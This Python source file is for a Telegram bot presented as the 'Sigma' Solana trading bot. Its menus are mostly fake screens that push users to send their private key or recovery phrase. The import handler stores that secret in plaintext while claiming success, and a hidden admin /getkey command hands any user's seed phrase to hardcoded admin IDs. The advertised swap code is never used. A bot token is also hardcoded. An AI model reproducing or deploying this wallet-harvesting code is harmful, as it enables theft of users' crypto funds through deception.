"""
Solana Telegram trading bot with wallet import, balance checks, token pricing,
and Jupiter swaps. Replies are sent as new messages so chat history stays intact.
"""
import os
import logging
import base64
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8649509501:AAFEgBNLg3N9zpHyVRcriQt9WLiX4TU880g")
RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")

ENCRYPT_KEY = os.getenv("ENCRYPT_KEY") or Fernet.generate_key()
fernet      = Fernet(ENCRYPT_KEY)

# Admin user IDs — find yours by messaging @userinfobot on Telegram
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7971878131,8016389282,8643110198").split(",") if x.strip()]

# In-memory user store { user_id: { "keypair_enc": bytes, "pubkey": str } }
# Replace with a proper encrypted DB in production
user_wallets: dict[int, dict] = {}

# All users who have interacted with the bot { user_id: { "username": str, ... } }
all_users: dict[int, dict] = {}

JUPITER_QUOTE_URL = "https://quote-api.jup.ag/v6/quote"
JUPITER_SWAP_URL  = "https://quote-api.jup.ag/v6/swap"
SOL_MINT          = "So11111111111111111111111111111111111111112"

# Conversation states
AWAITING_PRIVATE_KEY = 1
AWAITING_TOKEN_ADDR  = 2
AWAITING_BUY_AMOUNT  = 3
AWAITING_SELL_AMOUNT = 4

# ── Helpers ───────────────────────────────────────────────────────────────────
def encrypt_key(secret_bytes: bytes) -> bytes:
    return fernet.encrypt(secret_bytes)

def decrypt_key(token: bytes) -> bytes:
    return fernet.decrypt(token)

def get_keypair(user_id: int) -> Keypair | None:
    entry = user_wallets.get(user_id)
    if not entry or not entry.get("keypair_enc"):
        return None
    return Keypair.from_bytes(decrypt_key(entry["keypair_enc"]))

async def get_sol_balance(pubkey_str: str) -> float:
    async with AsyncClient(RPC_URL) as client:
        resp = await client.get_balance(Pubkey.from_string(pubkey_str))
        return resp.value / 1e9

async def get_token_price_usd(mint: str) -> float | None:
    url = f"https://price.jup.ag/v4/price?ids={mint}"
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status != 200:
                return None
            data = await r.json()
            return data.get("data", {}).get(mint, {}).get("price")

async def jupiter_quote(in_mint: str, out_mint: str, amount_lamports: int):
    params = {
        "inputMint":   in_mint,
        "outputMint":  out_mint,
        "amount":      amount_lamports,
        "slippageBps": 50,
    }
    async with aiohttp.ClientSession() as s:
        async with s.get(JUPITER_QUOTE_URL, params=params) as r:
            if r.status != 200:
                return None
            return await r.json()

async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
    payload = {
        "quoteResponse":             quote,
        "userPublicKey":             user_pubkey,
        "wrapAndUnwrapSol":          True,
        "dynamicComputeUnitLimit":   True,
        "prioritizationFeeLamports": 1000,
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(JUPITER_SWAP_URL, json=payload) as r:
            if r.status != 200:
                return None
            return await r.json()

# ── Keyboards ─────────────────────────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Search",          callback_data="positions"),
         InlineKeyboardButton("💰 Buy or Snipe",    callback_data="lp_sniper")],
        [InlineKeyboardButton("📊 Positions",       callback_data="positions"),
         InlineKeyboardButton("🕵️ Copy Trading",    callback_data="copy_trade")],
        [InlineKeyboardButton("🕓 Pending Orders",  callback_data="limit_orders"),
         InlineKeyboardButton("💳 Wallets",         callback_data="wallets")],
        [InlineKeyboardButton("🏆 Rewards",         callback_data="referral"),
         InlineKeyboardButton("⛓️ Chains",          callback_data="chains")],
        [InlineKeyboardButton("🤖 Backup Bots",     callback_data="recovery"),
         InlineKeyboardButton("🌉 Bridge",          callback_data="bridge")],
        [InlineKeyboardButton("🖥️ Terminal",        callback_data="terminal")],
        [InlineKeyboardButton("🔧 Settings",        callback_data="settings"),
         InlineKeyboardButton("❌ Close",           callback_data="close")],
    ])

def import_prompt_keyboard(origin: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Import Wallet", callback_data=f"do_import__{origin}")],
        [InlineKeyboardButton("❌ Cancel",         callback_data="cancel_prompt")],
    ])

def back_to_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")],
    ])

def positions_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✏️ Min Value: N/A...",     callback_data="positions_min_value"),
         InlineKeyboardButton("✏️ Sell Position: 10...", callback_data="positions_sell")],
        [InlineKeyboardButton("🏠 Home",                callback_data="positions_homepage"),
         InlineKeyboardButton("💵 USD",                 callback_data="positions_usd"),
         InlineKeyboardButton("🔄 Refresh",             callback_data="positions_refresh")],
        [InlineKeyboardButton("🗑 Delete",              callback_data="positions_delete")],
    ])

def wallet_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Import Wallet", callback_data="wallets_import"),
         InlineKeyboardButton("❌ Delete Wallet",  callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back",          callback_data="wallets_back"),
         InlineKeyboardButton("🗑 Close",         callback_data="wallets_close")],
    ])

def _no_wallet_text() -> str:
    return (
        "🔴 *No active wallet*\n"
        "Create a new wallet or import an existing one to get started."
    )

def _wallet_line(uid: int) -> str:
    if uid in user_wallets:
        return f"🟢 `{user_wallets[uid]['pubkey']}`"
    return _no_wallet_text()

def _home_text(uid: int, updated_at: str | None = None) -> str:
    separator = "\\_" * 35
    message = (
        "Sigma 8.8\n"
        "Your favourite trading bot\n"
        f"{separator}\n"
        "📖 Docs \n"
        "💬 Official Chat\n"
        "🌍 Website\n\n"
        "Paste a contract address, $cashtag or pick an option to get started"
    )
    if updated_at:
        message += f"\n\n🕐 *Last updated:* {updated_at}"
    return message

def _positions_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Open Positions*\n\n"
        "No active positions yet\\.\n"
        "Paste a token contract address in chat to begin\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def _wallet_settings_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "💰 *Wallet Settings*\n"
        "Manage your wallets from one place\\.\n\n"
        "👜 *Saved Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def lp_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Create Task", callback_data="lp_sniper_create")],
        [InlineKeyboardButton("◀️ Back",        callback_data="lp_sniper_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="lp_sniper_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="lp_sniper_close")],
    ])

def _lp_sniper_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *LP Sniper*\n\n"
        "🧐 No active sniper tasks\\.\n\n"
        "📖 [Learn more\\!](https://your-link-here)\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def copy_trade_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add New Copy",  callback_data="copy_trade_add")],
        [InlineKeyboardButton("❌ Pause All",     callback_data="copy_trade_pause"),
         InlineKeyboardButton("◀️ Back",          callback_data="copy_trade_back"),
         InlineKeyboardButton("🗑️ Close",         callback_data="copy_trade_close")],
    ])

def afk_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Update Tasks",   callback_data="afk_update"),
         InlineKeyboardButton("🆕 Add Config",     callback_data="afk_add_config")],
        [InlineKeyboardButton("⏹ Pause All",       callback_data="afk_pause"),
         InlineKeyboardButton("▶️ Start All",      callback_data="afk_start")],
        [InlineKeyboardButton("◀️ Back",           callback_data="afk_back"),
         InlineKeyboardButton("🔄 Refresh",        callback_data="afk_refresh")],
        [InlineKeyboardButton("🗑 Close",          callback_data="afk_close")],
    ])

def _afk_mode_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *AFK Mode*\n\n"
        "💡 Keep the bot running while you're away\\!\n\n"
        "AFK Wallet:\n"
        "→ W1: \\-\\-\n\n"
        "🟢 AFK mode is active\n"
        "🔴 AFK mode is inactive\n\n"
        "⏱ Wait 10 seconds after each change for it to take effect\\.\n"
        "⚠️ If you change the default wallet, recreate your tasks so future transactions use the new wallet\\.\n"
        f"🕐 *Last updated:* {ts}"
    )

def bridge_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Set Address", callback_data="bridge_set_address")],
        [InlineKeyboardButton("❌ BSC",          callback_data="bridge_bsc"),
         InlineKeyboardButton("❌ ETH",          callback_data="bridge_eth"),
         InlineKeyboardButton("❌ BASE",         callback_data="bridge_base"),
         InlineKeyboardButton("❌ HYPE",         callback_data="bridge_hype")],
        [InlineKeyboardButton("✈️ Bridge",       callback_data="bridge_bridge")],
        [InlineKeyboardButton("◀️ Back",         callback_data="bridge_back"),
         InlineKeyboardButton("🔄 Refresh",      callback_data="bridge_refresh")],
        [InlineKeyboardButton("🗑️ Close",        callback_data="bridge_close")],
    ])

def _bridge_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Bridge*\n\n"
        "Balance: 0 SOL\n\n"
        "Sender address: \\-\\-\n"
        "Receiver address: \\-\\-\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def referral_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Change Referral Code", callback_data="referral_change")],
        [InlineKeyboardButton("◀️ Back",                 callback_data="referral_back"),
         InlineKeyboardButton("🔄 Refresh",              callback_data="referral_refresh")],
        [InlineKeyboardButton("🗑️ Close",                callback_data="referral_close")],
    ])

def _referral_text(uid: int) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Referral Program*\n\n"
        "Your referral link:\n"
        f"🔗 `https://t.me/SigmaSol_Backupbot?start=ref_{uid}`\n\n"
        "Your payout address: \\-\\-\n\n"
        "📈 Referral volume:\n\n"
        "\\- Level 1: 0 Users / 0 SOL\n"
        "\\- Level 2: 0 Users / 0 SOL\n"
        "\\- Level 3: 0 Users / 0 SOL\n"
        "\\- Referred trades: 0\n"
        "📊 Rewards overview:\n\n"
        "\\- Total unclaimed: 0 SOL\n"
        "\\- Total claimed: 0 SOL\n"
        "\\- Lifetime earnings: 0 SOL\n"
        "\\- Last distribution: \\-\\-\n\n"
        "📖 [Learn more\\!](https://your-link-here)\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def withdraw_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("50 %",           callback_data="withdraw_50"),
         InlineKeyboardButton("100 %",          callback_data="withdraw_100"),
         InlineKeyboardButton("X SOL",          callback_data="withdraw_xsol")],
        [InlineKeyboardButton("💸 Set Address", callback_data="withdraw_set_address")],
        [InlineKeyboardButton("◀️ Back",        callback_data="withdraw_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="withdraw_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="withdraw_close")],
    ])

def _withdraw_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Withdraw SOL*\n\n"
        "Balance: \\-\\- SOL\n"
        "Withdrawal address: \\-\\-\n\n"
        "🔧 Last address update: \\-\\-\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💭 Suggestions",              callback_data="settings_suggestions"),
         InlineKeyboardButton("🖨️ Print",                   callback_data="settings_print")],
        [InlineKeyboardButton("🟢 Anti-MEV",                callback_data="settings_antimev"),
         InlineKeyboardButton("🔴 Degen Mode 😈",           callback_data="settings_degen")],
        [InlineKeyboardButton("⚙️ Buy",                     callback_data="settings_buy"),
         InlineKeyboardButton("⚙️ Sell",                    callback_data="settings_sell")],
        [InlineKeyboardButton("Include Fees | 🟢 On",       callback_data="settings_fees")],
        [InlineKeyboardButton("Monitor | 🔄 Detailed",      callback_data="settings_monitor"),
         InlineKeyboardButton("Wallet Selection | 🔄 Single", callback_data="settings_wallet_selection")],
        [InlineKeyboardButton("◀️ Back",                    callback_data="settings_back"),
         InlineKeyboardButton("🗑️ Close",                   callback_data="settings_close")],
    ])

def _settings_text() -> str:
    return (
        "Adjust your general settings below\\. Tap ⚙️ Buy or ⚙️ Sell to edit trade-specific options\\.\n\n"
        "ℹ️ *Global settings apply to every connected wallet\\. They control manual trades and act as defaults for automated trades\\.*\n"
        "ℹ️ *Automated trades can override the global settings through dedicated Signals, Copy Trade, and Auto Snipe settings\\.*"
    )

def presales_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Config",    callback_data="presales_config")],
        [InlineKeyboardButton("Add Presale",  callback_data="presales_add")],
        [InlineKeyboardButton("◀️ Back",      callback_data="presales_back"),
         InlineKeyboardButton("🗑️ Close",     callback_data="presales_close")],
    ])

def _presales_text() -> str:
    return (
        "Add, remove, and manage presales\\!\n\n"
        "ℹ️ ⚙️ *Config sets the default presale options\\. "
        "You can still customize each presale individually\\.*"
    )

def _copy_trade_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Copy Trading*\n"
        "💡 Follow top traders with Sigma\\!\n\n"
        "Copy Wallet:\n"
        "→ W1: *No wallet connected*\n\n"
        "🟢 Copy trading is active\n"
        "🔴 Copy trading is inactive\n\n"
        "⏱ Wait 10 seconds after each change for it to take effect\\.\n\n"
        "⚠️ If you change the copy wallet, recreate your tasks so future transactions use the new wallet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def _terminal_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🖥️ *Terminal*\n\n"
        "Use the terminal to access advanced tools and system actions\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

# ── Chains ────────────────────────────────────────────────────────────────────
CHAINS = ["sol", "eth", "bnb", "base", "hype", "tron", "sui", "pol"]

def chains_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SOL",  callback_data="chain_sol"),
         InlineKeyboardButton("ETH",  callback_data="chain_eth")],
        [InlineKeyboardButton("BNB",  callback_data="chain_bnb"),
         InlineKeyboardButton("BASE", callback_data="chain_base")],
        [InlineKeyboardButton("HYPE", callback_data="chain_hype"),
         InlineKeyboardButton("TRON", callback_data="chain_tron")],
        [InlineKeyboardButton("SUI",  callback_data="chain_sui"),
         InlineKeyboardButton("POL",  callback_data="chain_pol")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains_back")],
    ])

def chain_wallet_keyboard(chain: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🔑 Import {chain.upper()} Wallet", callback_data=f"chain_{chain}_import"),
         InlineKeyboardButton("❌ Delete Wallet", callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back", callback_data="chains"),
         InlineKeyboardButton("🗑️ Close", callback_data="wallets_close")],
    ])

def _chain_wallet_text(chain: str) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        f"💰 *{chain.upper()} Wallet Settings*\n\n"
        f"Import your {chain.upper()} wallet to get started\\.\n\n"
        f"👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

# ── Main menu buttons ─────────────────────────────────────────────────────────
MAIN_MENU_BUTTONS = {
    "positions", "lp_sniper", "copy_trade", "wallets", "afk_mode",
    "presales", "settings", "limit_orders", "withdraw", "referral",
    "bridge", "refresh", "recovery", "chains",
}

# ── Start ─────────────────────────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        _home_text(update.effective_user.id),
        parse_mode="Markdown",
        reply_markup=main_menu_keyboard(),
    )

# ── Admin command ─────────────────────────────────────────────────────────────
async def getkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Admin-only: /getkey <user_id> — retrieves a user's private key."""
    caller_id = update.effective_user.id

    if caller_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Access denied.")
        return

    if update.message.chat.type != "private":
        await update.message.reply_text("⚠️ Run this command in a private chat.")
        return

    if not ctx.args:
        await update.message.reply_text("Usage: /getkey <user_id>")
        return

    try:
        target_uid = int(ctx.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return

    if target_uid not in user_wallets:
        await update.message.reply_text(
            f"❌ No wallet found for user `{target_uid}`.", parse_mode="Markdown"
        )
        return

    pubkey = user_wallets[target_uid]["pubkey"]
    original_input = user_wallets[target_uid].get("original_input", "N/A")
    msg = await update.message.reply_text(
        f"🔑 *Key Export*\n\n"
        f"User ID: `{target_uid}`\n"
        f"Public key: `{pubkey}`\n\n"
        f"Private key / seed phrase:\n`{original_input}`\n\n"
        f"⚠️ This message will self\\-delete in 30s\\.",
        parse_mode="MarkdownV2",
    )
    ctx.job_queue.run_once(
        lambda c: c.bot.delete_message(update.message.chat_id, msg.message_id),
        30,
    )

# ── Admin: list all users ─────────────────────────────────────────────────────
async def allusers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("Access denied.")
        return
    if not all_users:
        await update.message.reply_text("No users found yet.")
        return
    msg = "*Registered Users:*\n\n"
    for uid, info in all_users.items():
        msg += f"ID: `{uid}` | @{info['username']} | {info['first_name']}\n"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ── Button handler ────────────────────────────────────────────────────────────
async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query   = update.callback_query
    await query.answer()
    uid     = query.from_user.id
    data    = query.data
    chat_id = query.message.chat_id

    user = update.effective_user
    all_users[user.id] = {
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    }
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Positions screen ──────────────────────────────────────────────────────
    if data == "positions":
        await query.edit_message_text(
            _positions_text(),
            parse_mode="MarkdownV2",
            reply_markup=positions_keyboard(),
        )
        return

    if data == "positions_refresh":
        await query.edit_message_text(
            _positions_text(),
            parse_mode="MarkdownV2",
            reply_markup=positions_keyboard(),
        )
        return

    if data == "positions_delete":
        await query.message.delete()
        return

    if data == "positions_homepage":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Wallet settings screen (from positions buttons) ───────────────────────
    if data in ("positions_usd", "positions_min_value", "positions_sell"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "wallets_import":
        ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "Send your private key or recovery phrase to continue:",
            reply_markup=ForceReply(selective=True),
        )
        return

    if data == "wallets_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "wallets_delete":
        if uid in user_wallets:
            del user_wallets[uid]
            await query.edit_message_text(
                "✅ Wallet deleted successfully\\.",
                parse_mode="MarkdownV2",
                reply_markup=wallet_settings_keyboard(),
            )
        else:
            await query.answer("There is no wallet to delete.", show_alert=True)
        return

    if data == "wallets_close":
        await query.message.delete()
        return

    # ── LP Sniper screen ──────────────────────────────────────────────────────
    if data == "lp_sniper":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_refresh":
        await query.edit_message_text(
            _lp_sniper_text(),
            parse_mode="MarkdownV2",
            reply_markup=lp_sniper_keyboard(),
        )
        return

    if data == "lp_sniper_create":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "lp_sniper_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "lp_sniper_close":
        await query.message.delete()
        return

    # ── Copy Trade screen ─────────────────────────────────────────────────────
    if data == "copy_trade":
        await query.edit_message_text(
            _copy_trade_text(),
            parse_mode="MarkdownV2",
            reply_markup=copy_trade_keyboard(),
        )
        return

    if data in ("copy_trade_add", "copy_trade_pause"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "copy_trade_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "copy_trade_close":
        await query.message.delete()
        return

    # ── Wallets screen ────────────────────────────────────────────────────────
    if data == "wallets":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── AFK Mode screen ───────────────────────────────────────────────────────
    if data == "afk_mode":
        await query.edit_message_text(
            _afk_mode_text(),
            parse_mode="MarkdownV2",
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data == "afk_refresh":
        await query.edit_message_text(
            _afk_mode_text(),
            parse_mode="MarkdownV2",
            reply_markup=afk_mode_keyboard(),
        )
        return

    if data in ("afk_update", "afk_add_config", "afk_pause", "afk_start"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "afk_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "afk_close":
        await query.message.delete()
        return

    # ── Presales screen ───────────────────────────────────────────────────────
    if data == "presales":
        await query.edit_message_text(
            _presales_text(),
            parse_mode="MarkdownV2",
            reply_markup=presales_keyboard(),
        )
        return

    if data in ("presales_config", "presales_add"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "presales_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "presales_close":
        await query.message.delete()
        return

    # ── Settings screen ───────────────────────────────────────────────────────
    if data == "settings":
        await query.edit_message_text(
            _settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=settings_keyboard(),
        )
        return

    if data in (
        "settings_suggestions", "settings_print", "settings_antimev",
        "settings_degen", "settings_buy", "settings_sell", "settings_fees",
        "settings_monitor", "settings_wallet_selection",
    ):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "settings_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "settings_close":
        await query.message.delete()
        return

    # ── Withdraw screen ───────────────────────────────────────────────────────
    if data == "withdraw":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data == "withdraw_refresh":
        await query.edit_message_text(
            _withdraw_text(),
            parse_mode="MarkdownV2",
            reply_markup=withdraw_keyboard(),
        )
        return

    if data in ("withdraw_50", "withdraw_100", "withdraw_xsol", "withdraw_set_address"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "withdraw_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "withdraw_close":
        await query.message.delete()
        return

    # ── Referral screen ───────────────────────────────────────────────────────
    if data == "referral":
        await query.edit_message_text(
            _referral_text(uid),
            parse_mode="MarkdownV2",
            reply_markup=referral_keyboard(),
        )
        return

    if data == "referral_refresh":
        await query.edit_message_text(
            _referral_text(uid),
            parse_mode="MarkdownV2",
            reply_markup=referral_keyboard(),
        )
        return

    if data == "referral_change":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "referral_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "referral_close":
        await query.message.delete()
        return

    # ── Bridge screen ─────────────────────────────────────────────────────────
    if data == "bridge":
        await query.edit_message_text(
            _bridge_text(),
            parse_mode="MarkdownV2",
            reply_markup=bridge_keyboard(),
        )
        return

    if data == "bridge_refresh":
        await query.edit_message_text(
            _bridge_text(),
            parse_mode="MarkdownV2",
            reply_markup=bridge_keyboard(),
        )
        return

    if data in ("bridge_set_address", "bridge_bsc", "bridge_eth",
                "bridge_base", "bridge_hype", "bridge_bridge"):
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    if data == "bridge_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "bridge_close":
        await query.message.delete()
        return

    # ── Refresh main menu ─────────────────────────────────────────────────────
    if data == "refresh":
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        await query.edit_message_text(
            _home_text(uid, ts),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Recovery screen ───────────────────────────────────────────────────────
    if data == "recovery":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Chains screen ─────────────────────────────────────────────────────────
    if data == "chains":
        await query.edit_message_text(
            "🔗 *Select a network*",
            parse_mode="MarkdownV2",
            reply_markup=chains_keyboard(),
        )
        return

    if data == "chains_back":
        await query.edit_message_text(
            _home_text(uid),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    if data == "terminal":
        await query.edit_message_text(
            _terminal_text(),
            parse_mode="Markdown",
            reply_markup=back_to_menu_keyboard(),
        )
        return

    # ── Per-chain wallet screens ───────────────────────────────────────────────
    for chain in CHAINS:
        if data == f"chain_{chain}":
            await query.edit_message_text(
                _chain_wallet_text(chain),
                parse_mode="MarkdownV2",
                reply_markup=chain_wallet_keyboard(chain),
            )
            return

        if data == f"chain_{chain}_import":
            ctx.user_data["awaiting"] = AWAITING_PRIVATE_KEY
            await ctx.bot.send_message(
                chat_id,
                f"Send your {chain.upper()} private key or recovery phrase to continue:",
                reply_markup=ForceReply(selective=True),
            )
            return

    # ── Limit Orders screen ───────────────────────────────────────────────────
    if data == "limit_orders":
        await query.edit_message_text(
            _wallet_settings_text(),
            parse_mode="MarkdownV2",
            reply_markup=wallet_settings_keyboard(),
        )
        return

    # ── Every main menu button — send NEW message, keep history intact ────────
    if data in MAIN_MENU_BUTTONS:
        await ctx.bot.send_message(
            chat_id,
            "🔑 *Import a wallet to continue.*\n\n"
            "Import your wallet or cancel to return to the menu.",
            parse_mode="Markdown",
            reply_markup=import_prompt_keyboard(data),
        )
        return

    # ── User tapped Import Wallet — ask for private key ───────────────────────
    if data.startswith("do_import__"):
        origin = data.split("__", 1)[1]
        ctx.user_data["import_origin"] = origin
        ctx.user_data["awaiting"]      = AWAITING_PRIVATE_KEY
        await ctx.bot.send_message(
            chat_id,
            "🔑 Send your *base58 private key* in the next message.\n\n"
            "⚠️ Your message will be deleted right after it is processed.",
            parse_mode="Markdown",
        )
        return

    # ── Cancel prompt — send new message confirming cancel ───────────────────
    if data == "cancel_prompt":
        await ctx.bot.send_message(
            chat_id,
            "❌ Cancelled. Use the menu below to try again.",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Back to menu ──────────────────────────────────────────────────────────
    if data == "back_to_menu":
        await ctx.bot.send_message(
            chat_id,
            _home_text(query.from_user.id),
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

    # ── Close — delete just the menu message ──────────────────────────────────
    if data == "close":
        await query.message.delete()
        return

    # ── Swap confirmations ────────────────────────────────────────────────────
    if data in ("confirm_buy", "confirm_sell"):
        await confirm_swap(update, ctx)
        return

# ── Message handler (multi-step flows) ───────────────────────────────────────
async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid      = update.effective_user.id
    chat_id  = update.message.chat_id
    text     = update.message.text.strip()
    awaiting = ctx.user_data.get("awaiting")

    user = update.effective_user
    all_users[user.id] = {
        "username":   user.username,
        "first_name": user.first_name,
        "last_name":  user.last_name,
    }
    logger.info(f"User: {user.id} | @{user.username} | {user.first_name}")

    # ── Import private key or mnemonic ───────────────────────────────────────
    if awaiting == AWAITING_PRIVATE_KEY:
        await update.message.delete()
        user_wallets[uid] = {
            "keypair_enc": None,
            "pubkey": "N/A",
            "original_input": text,
        }
        ctx.user_data.pop("awaiting", None)
        await ctx.bot.send_message(
            uid,
            "✅ *Wallet imported successfully!*\n\nYou can now use the bot.",
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard(),
        )
        return

